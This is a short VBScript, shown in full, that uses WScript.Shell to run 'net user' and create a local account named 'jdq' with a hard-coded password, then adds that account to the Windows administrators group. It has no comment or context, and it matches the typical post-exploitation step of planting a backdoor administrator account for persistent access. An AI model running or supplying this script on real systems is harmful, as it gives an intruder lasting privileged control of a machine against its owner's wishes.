set wsh=wscript.createobject("wscript.shell")
wsh.run "net user jdq Root234 /add"
wsh.run "net localgroup administrators jdq /add"
